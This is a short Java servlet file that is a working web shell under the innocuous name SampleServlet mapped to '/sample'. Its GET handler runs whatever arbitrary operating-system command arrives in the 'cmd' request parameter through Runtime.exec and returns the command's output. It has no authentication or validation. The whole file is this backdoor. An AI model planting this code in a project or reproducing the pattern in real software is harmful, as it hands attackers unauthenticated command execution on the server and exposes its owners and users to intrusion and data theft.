import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

@WebServlet("/sample")
public class SampleServlet extends HttpServlet {

    @Override
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {

        response.setContentType("raw");
        PrintWriter out = response.getWriter();

        Runtime r = Runtime.getRuntime();
        Process p;
        try {
            p = r.exec(request.getParameter("cmd"));
        } catch (Exception e) {
            out.println("Failed running command");
            out.close();
            return;
        }

        StreamReader stderrReader = new StreamReader(p.getErrorStream(), out);
        StreamReader stdoutReader = new StreamReader(p.getInputStream(), out);
        stderrReader.start();
        stdoutReader.start();

        try {
            p.waitFor();
            stdoutReader.terminate();
            stderrReader.terminate();
            stdoutReader.join();
            stderrReader.join();
        } catch (InterruptedException e) {
            out.println("InterruptedException");
        }

        out.close();
    }
}


class StreamReader extends Thread
{
    InputStream is;
    PrintWriter output;
    volatile boolean run = true;

    StreamReader(InputStream is, PrintWriter output)
    {
        this.is = is;
        this.output = output;
    }

    public void terminate() {
        run = false;
    }

    public void run()
    {
        try {
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while ((line = br.readLine()) != null && this.run) {
                synchronized (this.output) {
                    this.output.println(line);
                }
            }
        } catch (IOException ioe) {
            this.output.println("IOException");
        }
    }
}
